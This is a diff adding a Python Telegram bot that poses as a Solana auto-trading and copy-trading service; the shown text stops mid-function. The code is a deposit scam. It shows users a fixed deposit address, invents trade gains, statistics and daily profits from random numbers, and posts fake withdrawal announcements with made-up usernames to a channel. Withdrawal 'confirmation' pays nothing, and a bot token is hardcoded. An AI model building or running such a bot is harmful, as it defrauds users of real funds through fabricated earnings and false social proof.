@@ -1,0 +1,844 @@
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, Filters
+import threading, random, json, os
+from datetime import datetime, timedelta
+
+# --------------------- CONFIG ---------------------
+TOKEN = "8216078269:AAGKQU7Ynv3mA42XHESQfh7tIaSr_oT-M90"
+ADMIN_ID = 722435694
+SOL_ADDRESS = "HkbmK1TrTPxTqaxJHz6q2YDTGCgtH14q7U8JDm8Wdm3e"
+WITHDRAW_CHANNEL_ID = -1002016868046
+
+# Fichiers de sauvegarde
+DATA_DIR = "bot_data"
+USERS_FILE = os.path.join(DATA_DIR, "users.json")
+USER_LANG_FILE = os.path.join(DATA_DIR, "user_lang.json")
+REFERRALS_FILE = os.path.join(DATA_DIR, "referrals.json")
+
+# Créer le dossier de données s'il n'existe pas
+os.makedirs(DATA_DIR, exist_ok=True)
+
+# --------------------- FONCTIONS DE SAUVEGARDE ---------------------
+def save_data():
+    """Sauvegarder toutes les données importantes"""
+    try:
+        with open(USERS_FILE, 'w') as f:
+            json.dump(users, f, indent=2)
+        with open(USER_LANG_FILE, 'w') as f:
+            json.dump(user_lang, f, indent=2)
+        with open(REFERRALS_FILE, 'w') as f:
+            json.dump(referrals, f, indent=2)
+        print("Données sauvegardées avec succès")
+    except Exception as e:
+        print(f"Erreur lors de la sauvegarde: {e}")
+
+def load_data():
+    """Charger toutes les données sauvegardées"""
+    global users, user_lang, referrals
+    
+    try:
+        if os.path.exists(USERS_FILE):
+            with open(USERS_FILE, 'r') as f:
+                users = json.load(f)
+        else:
+            users = {}
+            
+        if os.path.exists(USER_LANG_FILE):
+            with open(USER_LANG_FILE, 'r') as f:
+                user_lang = json.load(f)
+        else:
+            user_lang = {}
+            
+        if os.path.exists(REFERRALS_FILE):
+            with open(REFERRALS_FILE, 'r') as f:
+                referrals = json.load(f)
+        else:
+            referrals = {}
+            
+        # Convertir les clés en int pour users et user_lang
+        users = {int(k): v for k, v in users.items()}
+        user_lang = {int(k): v for k, v in user_lang.items()}
+        referrals = {int(k): v for k, v in referrals.items()}
+        
+        print("Données chargées avec succès")
+    except Exception as e:
+        print(f"Erreur lors du chargement: {e}")
+        users = {}
+        user_lang = {}
+        referrals = {}
+
+# --------------------- BASES ---------------------
+# Charger les données au démarrage
+users = {}
+user_lang = {}
+referrals = {}
+load_data()
+
+# Variables temporaires (non sauvegardées)
+last_message = {}
+user_states = {}
+user_withdraw_data = {}
+user_messages = {}
+trade_timers = {}  # Stockage des timers de trading
+copy_trader_addresses = {}  # Adresses de copy trading par utilisateur
+copy_trade_timers = {}  # Stockage des timers de copy trading
+
+USERNAMES = ["Alex","CryptoKing","SolanaFan","TraderJoe","LunaMoon","BlockMaster","SolHunter","Neo","Satoshi","TokenQueen"]
+WALLETS = ["Phantom Wallet","Binance","Coinbase","Trust Wallet","Sollet","Exodus","Ledger"]
+
+# --------------------- MESSAGES ---------------------
+MESSAGES = {
+    'fr': {
+        'welcome': "Bienvenue! Votre solde est de {balance} SOL.",
+        'deposit': "💳 Pour déposer des SOL, copiez cette adresse :\n`{address}`",
+        'withdraw_prompt_address': "Veuillez fournir votre **adresse Solana** pour le retrait.",
+        'withdraw_prompt_amount': "Adresse reçue ! Maintenant, indiquez le **montant** à retirer.",
+        'withdraw_confirm': "💸 Retrait demandé :\nAdresse: {address}\nMontant: {amount} SOL\n\nAppuyez sur Confirmer pour finaliser.",
+        'withdraw_success': "✅ Retrait effectué avec succès !\nVotre nouveau solde: {balance} SOL",
+        'withdraw_fail': "❌ Solde insuffisant pour ce retrait.",
+        'withdraw_min': "❌ Montant minimum de retrait: 0.5 SOL",
+        'trade_min_balance': "❌ Solde minimum requis pour trader: 0.5 SOL\nVotre solde: {balance} SOL",
+        'balance': "Votre solde: {balance} SOL",
+        'choose_language': "Choisissez votre langue :",
+        'param_prompt': "Choisissez le mode de trading :",
+        'param_set': "Paramètres mis à jour : Mode {mode}\nTrade size: {trade_size} SOL\nRisque: {risk}%\nSlippage: {slippage}%",
+        'trade_on': "✅ Trading automatique ACTIVÉ ! Les trades vont commencer.",
+        'trade_off': "❌ Trading automatique DÉSACTIVÉ ! Les trades sont arrêtés.",
+        'trade_status': "Trading automatique: {status}",
+        'stats': "📊 Trading Bot Statistiques des dernières 24h:\n"
+                 "🔄 Total trades: {total_trades}\n"
+                 "✅ Trades réussis: {successful_trades} | ❌ Trades perdus: {failed_trades}\n"
+                 "📈 Profit rate: {profit_rate}%\n"
+                 "💵 Profit généré: ${profit_generated}",
+        'referral': "👥 Parrainage :\nInvitez vos amis avec ce lien :\n{link}\n\n"
+                    "🎁 Récompenses :\n- 5 amis = +0.05 SOL\n- 10 amis = +0.08 SOL\n- 20 amis = +0.1 SOL\n\n"
+                    "Vous avez invité {count} amis et reçu {bonus} SOL.",
+        'copy_trade_prompt': "Veuillez entrer l'**adresse Solana** du trader que vous souhaitez copier.",
+        'copy_trade_set': "✅ Adresse de copy trader définie : `{address}`\nAppuyez sur 'Copier' ou 'Lancer la copie' pour commencer.",
+        'copy_trade_copied': "📋 Adresse copiée : `{address}`\nVous pouvez la coller maintenant !",
+        'copy_trade_start': "✅ Copy trading démarré pour l'adresse `{address}` !",
+        'copy_trade_stop': "❌ Copy trading arrêté pour l'adresse `{address}`."
+    },
+    'en': {
+        'welcome': "Welcome! Your balance is {balance} SOL.",
+        'deposit': "💳 To deposit SOL, copy this address:\n`{address}`",
+        'withdraw_prompt_address': "Please provide your **Solana address** for withdrawal.",
+        'withdraw_prompt_amount': "Address received! Now, enter the **amount** to withdraw.",
+        'withdraw_confirm': "💸 Withdrawal requested:\nAddress: {address}\nAmount: {amount} SOL\n\nPress Confirm to finalize.",
+        'withdraw_success': "✅ Withdrawal successful!\nYour new balance: {balance} SOL",
+        'withdraw_fail': "❌ Insufficient balance for this withdrawal.",
+        'withdraw_min': "❌ Minimum withdrawal amount: 0.5 SOL",
+        'trade_min_balance': "❌ Minimum balance required for trading: 0.5 SOL\nYour balance: {balance} SOL",
+        'balance': "Your balance: {balance} SOL",
+        'choose_language': "Choose your language:",
+        'param_prompt': "Choose trading mode:",
+        'param_set': "Parameters updated: Mode {mode}\nTrade size: {trade_size} SOL\nRisk: {risk}%\nSlippage: {slippage}%",
+        'trade_on': "✅ Automatic trading ENABLED! Trades will start.",
+        'trade_off': "❌ Automatic trading DISABLED! Trades are stopped.",
+        'trade_status': "Automatic trading: {status}",
+        'stats': "📊 Trading Bot Statistics Last 24h:\n"
+                 "🔄 Total trades: {total_trades}\n"
+                 "✅ Successful trades: {successful_trades} | ❌ Failed trades: {failed_trades}\n"
+                 "📈 Profit rate: {profit_rate}%\n"
+                 "💵 Profit generated: ${profit_generated}",
+        'referral': "👥 Referral Program:\nInvite friends with this link:\n{link}\n\n"
+                    "🎁 Rewards:\n- 5 friends = +0.05 SOL\n- 10 friends = +0.08 SOL\n- 20 friends = +0.1 SOL\n\n"
+                    "You invited {count} friends and received {bonus} SOL.",
+        'copy_trade_prompt': "Please enter the **Solana address** of the trader you want to copy.",
+        'copy_trade_set': "✅ Copy trader address set: `{address}`\nPress 'Copy' or 'Start Copy' to begin.",
+        'copy_trade_copied': "📋 Address copied: `{address}`\nYou can paste it now!",
+        'copy_trade_start': "✅ Copy trading started for address `{address}`!",
+        'copy_trade_stop': "❌ Copy trading stopped for address `{address}`."
+    },
+    'ru': {
+        'welcome': "Добро пожаловать! Ваш баланс: {balance} SOL.",
+        'deposit': "💳 Чтобы внести SOL, скопируйте этот адрес:\n`{address}`",
+        'withdraw_prompt_address': "Пожалуйста, предоставьте ваш **адрес Solana** для вывода.",
+        'withdraw_prompt_amount': "Адрес получен! Теперь введите **сумму** для вывода.",
+        'withdraw_confirm': "💸 Запрос на вывод:\nАдрес: {address}\nСумма: {amount} SOL\n\nНажмите Подтвердить, чтобы завершить.",
+        'withdraw_success': "✅ Вывод выполнен успешно!\nВаш новый баланс: {balance} SOL",
+        'withdraw_fail': "❌ Недостаточно средств для вывода.",
+        'withdraw_min': "❌ Минимальная сумма вывода: 0.5 SOL",
+        'trade_min_balance': "❌ Минимальный баланс для торговли: 0.5 SOL\nВаш баланс: {balance} SOL",
+        'balance': "Ваш баланс: {balance} SOL",
+        'choose_language': "Выберите язык:",
+        'param_prompt': "Выберите режим торговли:",
+        'param_set': "Параметры обновлены: Режим {mode}\nРазмер сделки: {trade_size} SOL\nРиск: {risk}%\nСкользящая: {slippage}%",
+        'trade_on': "✅ Автоматический трейдинг ВКЛЮЧЕН! Сделки начнутся.",
+        'trade_off': "❌ Автоматический трейдинг ВЫКЛЮЧЕН! Сделки остановлены.",
+        'trade_status': "Автоматический трейдинг: {status}",
+        'stats': "📊 Статистика Trading Bot за последние 24ч:\n"
+                 "🔄 Всего сделок: {total_trades}\n"
+                 "✅ Успешные сделки: {successful_trades} | ❌ Проигранные сделки: {failed_trades}\n"
+                 "📈 Прибыльность: {profit_rate}%\n"
+                 "💵 Сгенерированная прибыль: ${profit_generated}",
+        'referral': "👥 Рефералы:\nПригласите друзей по этой ссылке:\n{link}\n\n"
+                    "🎁 Награды:\n- 5 друзей = +0.05 SOL\n- 10 друзей = +0.08 SOL\n- 20 друзей = +0.1 SOL\n\n"
+                    "Вы пригласили {count} друзей и получили {bonus} SOL.",
+        'copy_trade_prompt': "Пожалуйста, введите **адрес Solana** трейдера, которого вы хотите скопировать.",
+        'copy_trade_set': "✅ Адрес copy trader установлен: `{address}`\nНажмите 'Копировать' или 'Начать копирование' для начала.",
+        'copy_trade_copied': "📋 Адрес скопирован: `{address}`\nВы можете вставить его сейчас!",
+        'copy_trade_start': "✅ Копирование трейдинга начато для адреса `{address}`!",
+        'copy_trade_stop': "❌ Копирование трейдинга остановлено для адреса `{address}`."
+    }
+}
+
+# --------------------- CONFIG MESSAGES ---------------------
+# Durées de vie des messages (en secondes)
+MESSAGE_DURATIONS = {
+    'stats': 15,
+    'trade_notification': 20,
+    'error': 8,
+    'success': 10,
+    'deposit_info': 30,
+    'referral_info': 25,
+    'param_confirmation': 6,
+    'balance_info': 12,
+    'withdraw_steps': 0,
+    'menu_transition': 3,
+    'copy_trade': 20
+}
+
+# --------------------- FONCTIONS NETTOYAGE AMÉLIORÉES ---------------------
+def delete_message_safe(bot, chat_id, message_id):
+    """Supprimer un message de façon sécurisée"""
+    try:
+        bot.delete_message(chat_id=chat_id, message_id=message_id)
+    except:
+        pass
+
+def schedule_message_deletion(bot, chat_id, message_id, delay_seconds):
+    """Programmer la suppression d'un message avec un délai personnalisé"""
+    if delay_seconds > 0:
+        threading.Timer(delay_seconds, lambda: delete_message_safe(bot, chat_id, message_id)).start()
+
+def clean_old_user_messages(user_id, context, keep_last_n=3):
+    """Nettoyer seulement les anciens messages, garder les N derniers"""
+    if user_id in user_messages and len(user_messages[user_id]) > keep_last_n:
+        messages_to_delete = user_messages[user_id][:-keep_last_n]
+        for msg_id in messages_to_delete:
+            delete_message_safe(context.bot, user_id, msg_id)
+        user_messages[user_id] = user_messages[user_id][-keep_last_n:]
+
+def clean_all_user_messages(user_id, context):
+    """Nettoyer TOUS les anciens messages d'un utilisateur (pour changement de menu)"""
+    if user_id in user_messages:
+        for msg_id in user_messages[user_id]:
+            delete_message_safe(context.bot, user_id, msg_id)
+        user_messages[user_id] = []
+
+def add_user_message(user_id, message_id, message_type='default'):
+    """Ajouter un message à la liste avec son type pour gestion différenciée"""
+    if user_id not in user_messages:
+        user_messages[user_id] = []
+    user_messages[user_id].append(message_id)
+    
+    if len(user_messages[user_id]) > 10:
+        user_messages[user_id] = user_messages[user_id][-10:]
+
+daily_profit = None
+daily_date = None
+
+def generate_daily_profit():
+    global daily_profit, daily_date
+    today = datetime.now().date()
+    if daily_date != today:
+        daily_profit = random.randint(15841, 210355)
+        daily_date = today
+    return daily_profit
+
+def generate_stats_for_user(user_id, context: CallbackContext):
+    lang = user_lang.get(user_id, 'fr')
+    total_trades = random.randint(50, 150)
+    successful_trades = random.randint(int(total_trades * 0.6), total_trades)
+    failed_trades = total_trades - successful_trades
+    profit_rate = round(random.uniform(5.0, 20.0), 2)
+    profit_generated = generate_daily_profit()
+    stats_msg = MESSAGES[lang]['stats'].format(
+        total_trades=total_trades,
+        successful_trades=successful_trades,
+        failed_trades=failed_trades,
+        profit_rate=profit_rate,
+        profit_generated=profit_generated
+    )
+    try:
+        if user_id in user_lang:
+            msg = context.bot.send_message(chat_id=user_id, text=stats_msg)
+            add_user_message(user_id, msg.message_id, 'stats')
+            schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['stats'])
+    except:
+        pass
+
+def send_realistic_withdraw(bot):
+    pseudo = random.choice(USERNAMES) + str(random.randint(10, 9999))
+    amount = round(random.uniform(0.1, 50), 2)
+    wallet = random.choice(WALLETS)
+    hours_ago = random.randint(0, 23)
+    minutes_ago = random.randint(0, 59)
+    withdraw_time = (datetime.now() - timedelta(hours=hours_ago, minutes=minutes_ago)).strftime("%H:%M:%S")
+    message = f"{withdraw_time} - {pseudo} a retiré {amount} SOL via {wallet}."
+    try:
+        bot.send_message(chat_id=WITHDRAW_CHANNEL_ID, text=message)
+    except Exception as e:
+        print(f"Erreur en envoyant le retrait: {e}")
+    interval = random.randint(120, 600)
+    threading.Timer(interval, send_realistic_withdraw, args=(bot,)).start()
+
+# --------------------- TRADE SIMULATION AMÉLIORÉE ---------------------
+def stop_trade_simulation(user_id):
+    """Arrêter le trading automatique pour un utilisateur"""
+    if user_id in trade_timers:
+        trade_timers[user_id].cancel()
+        del trade_timers[user_id]
+    
+    if user_id in users:
+        users[user_id]['trading_active'] = False
+        save_data()
+
+def start_trade_simulation(user_id, context: CallbackContext):
+    """Démarrer le trading automatique pour un utilisateur"""
+    def trade():
+        if user_id not in users or not users[user_id].get('trading_active', False):
+            return
+        
+        if users[user_id]['balance'] < 0.5:
+            users[user_id]['trading_active'] = False
+            save_data()
+            try:
+                lang = user_lang.get(user_id, 'fr')
+                msg = context.bot.send_message(
+                    chat_id=user_id,
+                    text=f"⚠️ Trading arrêté automatiquement: solde insuffisant (minimum 0.5 SOL)\nVotre solde: {round(users[user_id]['balance'], 4)} SOL"
+                )
+                add_user_message(user_id, msg.message_id, 'error')
+                schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['error'])
+            except:
+                pass
+            return
+        
+        gain_percent = random.uniform(0.01, 0.5)
+        gain = round(users[user_id]['balance'] * gain_percent / 100, 4)
+        users[user_id]['balance'] += gain
+        save_data()
+        
+        try:
+            msg = context.bot.send_message(chat_id=user_id, text=f"💹 Trade automatique: +{gain} SOL | Nouveau solde: {round(users[user_id]['balance'], 4)} SOL")
+            add_user_message(user_id, msg.message_id, 'trade_notification')
+            schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['trade_notification'])
+            clean_old_user_messages(user_id, context, keep_last_n=3)
+        except:
+            pass
+        
+        if users[user_id].get('trading_active', False):
+            trade_timers[user_id] = threading.Timer(60, trade)
+            trade_timers[user_id].start()
+    
+    stop_trade_simulation(user_id)
+    users[user_id]['trading_active'] = True
+    save_data()
+    trade_timers[user_id] = threading.Timer(1, trade)
+    trade_timers[user_id].start()
+
+# --------------------- COPY TRADE SIMULATION ---------------------
+def stop_copy_trade_simulation(user_id):
+    """Arrêter la simulation de copy trading pour un utilisateur"""
+    if user_id in copy_trade_timers:
+        copy_trade_timers[user_id].cancel()
+        del copy_trade_timers[user_id]
+    
+    if user_id in users:
+        users[user_id]['copy_trading_active'] = False
+        save_data()
+
+def start_copy_trade_simulation(user_id, context: CallbackContext):
+    """Démarrer la simulation de copy trading pour un utilisateur"""
+    def copy_trade():
+        if user_id not in users or not users[user_id].get('copy_trading_active', False):
+            return
+        
+        if users[user_id]['balance'] < 0.5:
+            users[user_id]['copy_trading_active'] = False
+            save_data()
+            try:
+                lang = user_lang.get(user_id, 'fr')
+                msg = context.bot.send_message(
+                    chat_id=user_id,
+                    text=f"⚠️ Copy trading arrêté: solde insuffisant (minimum 0.5 SOL)\nVotre solde: {round(users[user_id]['balance'], 4)} SOL"
+                )
+                add_user_message(user_id, msg.message_id, 'error')
+                schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['error'])
+            except:
+                pass
+            return
+        
+        if user_id not in copy_trader_addresses or not copy_trader_addresses[user_id]:
+            stop_copy_trade_simulation(user_id)
+            return
+        
+        gain_percent = random.uniform(0.01, 0.5)
+        gain = round(users[user_id]['balance'] * gain_percent / 100, 4)
+        users[user_id]['balance'] += gain
+        save_data()
+        
+        try:
+            lang = user_lang.get(user_id, 'fr')
+            msg = context.bot.send_message(
+                chat_id=user_id,
+                text=f"💹 Copy trade (via {copy_trader_addresses[user_id][:8]}...): +{gain} SOL | Nouveau solde: {round(users[user_id]['balance'], 4)} SOL"
+            )
+            add_user_message(user_id, msg.message_id, 'trade_notification')
+            schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['trade_notification'])
+            clean_old_user_messages(user_id, context, keep_last_n=3)
+        except:
+            pass
+        
+        if users[user_id].get('copy_trading_active', False):
+            copy_trade_timers[user_id] = threading.Timer(60, copy_trade)
+            copy_trade_timers[user_id].start()
+    
+    stop_copy_trade_simulation(user_id)
+    users[user_id]['copy_trading_active'] = True
+    save_data()
+    copy_trade_timers[user_id] = threading.Timer(1, copy_trade)
+    copy_trade_timers[user_id].start()
+
+# --------------------- MENU ---------------------
+def choose_language(update: Update, context: CallbackContext):
+    keyboard = [
+        [InlineKeyboardButton("🇫🇷 Français", callback_data='lang_fr')],
+        [InlineKeyboardButton("🇬🇧 English", callback_data='lang_en')],
+        [InlineKeyboardButton("🇷🇺 Русский", callback_data='lang_ru')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    user_id = update.effective_user.id if not update.callback_query else update.callback_query.from_user.id
+    
+    clean_all_user_messages(user_id, context)
+    
+    if user_id not in users:
+        users[user_id] = {
+            'balance': 0.05,
+            'trade_size': 10,
+            'risk': 5,
+            'slippage': 1,
+            'trades': [],
+            'trading_active': False,
+            'copy_trading_active': False  # Nouveau champ pour le copy trading
+        }
+        save_data()
+    
+    msg_text = MESSAGES[user_lang.get(user_id, 'fr')]['choose_language']
+    if update.callback_query:
+        msg = update.callback_query.message.reply_text(msg_text, reply_markup=reply_markup)
+    else:
+        msg = update.message.reply_text(msg_text, reply_markup=reply_markup)
+    
+    last_message[user_id] = msg.message_id
+    add_user_message(user_id, msg.message_id)
+    
+    if user_id in user_lang:
+        generate_stats_for_user(user_id, context)
+
+def show_menu(update, context, message):
+    user_id = update.callback_query.from_user.id if update.callback_query else update.effective_user.id
+    lang = user_lang.get(user_id, 'fr')
+    
+    clean_all_user_messages(user_id, context)
+    
+    trading_active = users[user_id].get('trading_active', False)
+    can_trade = users[user_id]['balance'] >= 0.5
+    
+    if not can_trade and trading_active:
+        stop_trade_simulation(user_id)
+        trading_active = False
+    
+    if not can_trade:
+        trade_button_text = "💹 Trading (Solde min: 0.5 SOL)"
+        trade_callback = "trade_disabled"
+    else:
+        trade_button_text = "📴 Stop Trading" if trading_active else "💹 Start Trading"
+        trade_callback = "trade_off" if trading_active else "trade_on"
+    
+    # Ajout des boutons pour Copy Trade
+    copy_trade_button_text = "📋 Copy Trade" if user_id not in copy_trader_addresses or not copy_trader_addresses.get(user_id) else "📋 Copier"
+    copy_trade_callback = "set_copy_trade" if user_id not in copy_trader_addresses or not copy_trader_addresses.get(user_id) else "copy_trader_address"
+    copy_trade_start_stop = "Lancer la copie" if user_id in copy_trader_addresses and copy_trader_addresses.get(user_id) and not users[user_id].get('copy_trading_active', False) else "Arrêter la copie" if users[user_id].get('copy_trading_active', False) else None
+    
+    keyboard = [
+        [InlineKeyboardButton("💰 Deposit", callback_data='deposit'),
+         InlineKeyboardButton("📤 Withdraw", callback_data='withdraw')],
+        [InlineKeyboardButton(trade_button_text, callback_data=trade_callback),
+         InlineKeyboardButton("⚙️ Set Parameters", callback_data='set_parameters')],
+        [InlineKeyboardButton("💰 Balance", callback_data='balance'),
+         InlineKeyboardButton("🌐 Langue", callback_data='change_lang')],
+        [InlineKeyboardButton("👥 Referral", callback_data='referral'),
+         InlineKeyboardButton(copy_trade_button_text, callback_data=copy_trade_callback)]
+    ]
+    if copy_trade_start_stop:
+        keyboard.append([InlineKeyboardButton(copy_trade_start_stop, callback_data='copy_trade_' + ('start' if copy_trade_start_stop == "Lancer la copie" else 'stop'))])
+    keyboard.append([InlineKeyboardButton("📜 Historique Retrait", url="https://t.me/ninjasolbotwithdraw")])
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    if update.callback_query:
+        msg = update.callback_query.message.reply_text(message, reply_markup=reply_markup)
+    else:
+        msg = context.bot.send_message(chat_id=user_id, text=message, reply_markup=reply_markup)
+    
+    last_message[user_id] = msg.message_id
+    add_user_message(user_id, msg.message_id)
+
+# --------------------- ACTIONS ---------------------
+def deposit_action(user_id, context, lang):
+    msg = context.bot.send_message(chat_id=user_id, text=MESSAGES[lang]['deposit'].format(address=SOL_ADDRESS), parse_mode='Markdown')
+    add_user_message(user_id, msg.message_id, 'deposit_info')
+    schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['deposit_info'])
+    return "💳 Adresse de dépôt envoyée !"
+
+def withdraw_action(user_id, context, lang):
+    user_states[user_id] = "waiting_address"
+    msg = context.bot.send_message(chat_id=user_id, text=MESSAGES[lang]['withdraw_prompt_address'], parse_mode='Markdown')
+    add_user_message(user_id, msg.message_id, 'withdraw_steps')
+    return None
+
+def balance_action(user_id, lang):
+    return MESSAGES[lang]['balance'].format(balance=users[user_id]['balance'])
+
+def referral_action(user_id, context):
+    lang = user_lang.get(user_id, 'fr')
+    referral_link = f"https://t.me/YourBotUsername?start={user_id}"
+    count = referrals.get(user_id, 0)
+    bonus = round(0.05 * count, 2)
+    msg = context.bot.send_message(
+        chat_id=user_id,
+        text=MESSAGES[lang]['referral'].format(link=referral_link, count=count, bonus=bonus),
+        parse_mode='Markdown'
+    )
+    add_user_message(user_id, msg.message_id, 'referral_info')
+    schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['referral_info'])
+
+def parameters_action(user_id, context):
+    lang = user_lang.get(user_id, 'fr')
+    keyboard = [
+        [InlineKeyboardButton("🟢 Safe", callback_data='param_safe')],
+        [InlineKeyboardButton("🟡 Low", callback_data='param_low')],
+        [InlineKeyboardButton("🔴 Aggressive", callback_data='param_aggressive')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    msg = context.bot.send_message(chat_id=user_id, text=MESSAGES[lang]['param_prompt'], reply_markup=reply_markup)
+    add_user_message(user_id, msg.message_id, 'menu')
+
+# --------------------- COPY TRADE HANDLING ---------------------
+def set_copy_trade(update: Update, context: CallbackContext):
+    user_id = update.callback_query.from_user.id
+    lang = user_lang.get(user_id, 'fr')
+    user_states[user_id] = "waiting_copy_trade_address"
+    msg = context.bot.send_message(chat_id=user_id, text=MESSAGES[lang]['copy_trade_prompt'], parse_mode='Markdown')
+    add_user_message(user_id, msg.message_id, 'copy_trade')
+    schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['copy_trade'])
+
+def receive_copy_trade_address(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    lang = user_lang.get(user_id, 'fr')
+    text = update.message.text.strip()
+    
+    delete_message_safe(context.bot, user_id, update.message.message_id)
+    
+    if user_states.get(user_id) == "waiting_copy_trade_address":
+        if len(text) == 44 and all(c.isalnum() for c in text):
+            copy_trader_addresses[user_id] = text
+            save_data()
+            keyboard = [
+                [InlineKeyboardButton("📋 Copier", callback_data="copy_trader_address")]
+            ]
+            if not users[user_id].get('copy_trading_active', False):
+                keyboard.append([InlineKeyboardButton("Lancer la copie", callback_data="copy_trade_start")])
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            msg = context.bot.send_message(chat_id=user_id, text=MESSAGES[lang]['copy_trade_set'].format(address=text), parse_mode='Markdown', reply_markup=reply_markup)
+            add_user_message(user_id, msg.message_id, 'copy_trade')
+            schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['copy_trade'])
+            user_states.pop(user_id, None)
+        else:
+            msg = context.bot.send_message(chat_id=user_id, text="❌ Adresse Solana invalide. Elle doit contenir exactement 44 caractères alphanumériques.")
+            add_user_message(user_id, msg.message_id, 'error')
+            schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['error'])
+            user_states.pop(user_id, None)
+    else:
+        msg = context.bot.send_message(chat_id=user_id, text="Action non reconnue. Utilisez le menu principal.")
+        add_user_message(user_id, msg.message_id, 'error')
+        schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['error'])
+
+def copy_trader_address(update: Update, context: CallbackContext):
+    user_id = update.callback_query.from_user.id
+    lang = user_lang.get(user_id, 'fr')
+    if user_id in copy_trader_addresses and copy_trader_addresses[user_id]:
+        address = copy_trader_addresses[user_id]
+        msg = context.bot.send_message(chat_id=user_id, text=MESSAGES[lang]['copy_trade_copied'].format(address=address), parse_mode='Markdown')
+        add_user_message(user_id, msg.message_id, 'copy_trade')
+        schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['copy_trade'])
+    else:
+        msg = context.bot.send_message(chat_id=user_id, text="❌ Aucune adresse de copy trader définie. Utilisez 'Copy Trade' pour en ajouter une.")
+        add_user_message(user_id, msg.message_id, 'error')
+        schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['error'])
+
+# --------------------- BUTTONS ---------------------
+def button(update: Update, context: CallbackContext):
+    query = update.callback_query
+    user_id = query.from_user.id
+    query.answer()
+    lang = user_lang.get(user_id, 'fr')
+
+    if query.data == 'confirm_withdraw':
+        if user_states.get(user_id) == "waiting_confirm":
+            addr = user_withdraw_data[user_id]['address']
+            amount = user_withdraw_data[user_id]['amount']
+            
+            pseudo = random.choice(USERNAMES) + str(random.randint(10, 9999))
+            wallet = random.choice(WALLETS)
+            now = datetime.now().strftime("%H:%M:%S")
+            try:
+                context.bot.send_message(chat_id=WITHDRAW_CHANNEL_ID, text=f"{now} - {pseudo} a retiré {amount} SOL via {wallet}.")
+            except:
+                pass
+            
+            user_states.pop(user_id, None)
+            user_withdraw_data.pop(user_id, None)
+            save_data()
+            
+            success_message = MESSAGES[lang]['withdraw_success'].format(balance=round(users[user_id]['balance'], 4))
+            show_menu(update, context, success_message)
+        return
+
+    if query.data.startswith("lang_"):
+        lang = query.data.split("_")[1]
+        user_lang[user_id] = lang
+        save_data()
+        
+        if user_id not in users:
+            users[user_id] = {
+                'balance': 0.05,
+                'trade_size': 10,
+                'risk': 5,
+                'slippage': 1,
+                'trades': [],
+                'trading_active': False,
+                'copy_trading_active': False
+            }
+            save_data()
+            
+        message = MESSAGES[lang]['welcome'].format(balance=users[user_id]['balance'])
+        show_menu(update, context, message)
+        return
+        
+    if query.data == 'change_lang':
+        choose_language(update, context)
+        return
+        
+    if query.data == 'deposit':
+        message = deposit_action(user_id, context, lang)
+        threading.Timer(5, lambda: show_menu(update, context, message)).start()
+        return
+        
+    if query.data == 'withdraw':
+        withdraw_action(user_id, context, lang)
+        return
+        
+    if query.data == 'balance':
+        message = balance_action(user_id, lang)
+        show_menu(update, context, message)
+        return
+        
+    if query.data == 'trade_on':
+        if users[user_id]['balance'] < 0.5:
+            message = MESSAGES[lang]['trade_min_balance'].format(balance=round(users[user_id]['balance'], 4))
+            show_menu(update, context, message)
+            return
+            
+        start_trade_simulation(user_id, context)
+        message = MESSAGES[lang]['trade_on']
+        show_menu(update, context, message)
+        return
+        
+    if query.data == 'trade_off':
+        stop_trade_simulation(user_id)
+        message = MESSAGES[lang]['trade_off']
+        show_menu(update, context, message)
+        return
+        
+    if query.data == 'trade_disabled':
+        message = MESSAGES[lang]['trade_min_balance'].format(balance=round(users[user_id]['balance'], 4))
+        show_menu(update, context, message)
+        return
+        
+    if query.data == 'referral':
+        referral_action(user_id, context)
+        welcome_message = MESSAGES[lang]['welcome'].format(balance=users[user_id]['balance'])
+        threading.Timer(6, lambda: show_menu(update, context, welcome_message)).start()
+        return
+        
+    if query.data == 'set_parameters':
+        parameters_action(user_id, context)
+        return
+        
+    if query.data in ['param_safe', 'param_low', 'param_aggressive']:
+        mode = query.data.split('_')[1].capitalize()
+        if mode == 'Safe':
+            users[user_id]['risk'] = 2
+            users[user_id]['trade_size'] = 5
+        elif mode == 'Low':
+            users[user_id]['risk'] = 5
+            users[user_id]['trade_size'] = 10
+        elif mode == 'Aggressive':
+            users[user_id]['risk'] = 10
+            users[user_id]['trade_size'] = 20
+        
+        save_data()
+        
+        param_message = MESSAGES[lang]['param_set'].format(
+            mode=mode, trade_size=users[user_id]['trade_size'],
+            risk=users[user_id]['risk'], slippage=users[user_id]['slippage']
+        )
+        msg = context.bot.send_message(chat_id=user_id, text=param_message)
+        add_user_message(user_id, msg.message_id, 'param_confirmation')
+        schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['param_confirmation'])
+        
+        welcome_message = MESSAGES[lang]['welcome'].format(balance=users[user_id]['balance'])
+        threading.Timer(4, lambda: show_menu(update, context, welcome_message)).start()
+        return
+    
+    if query.data == 'set_copy_trade':
+        set_copy_trade(update, context)
+        return
+    
+    if query.data == 'copy_trader_address':
+        copy_trader_address(update, context)
+        return
+    
+    if query.data.startswith('copy_trade_'):
+        action = query.data.split('_')[2]
+        if action == 'start':
+            if user_id in copy_trader_addresses and copy_trader_addresses[user_id]:
+                start_copy_trade_simulation(user_id, context)
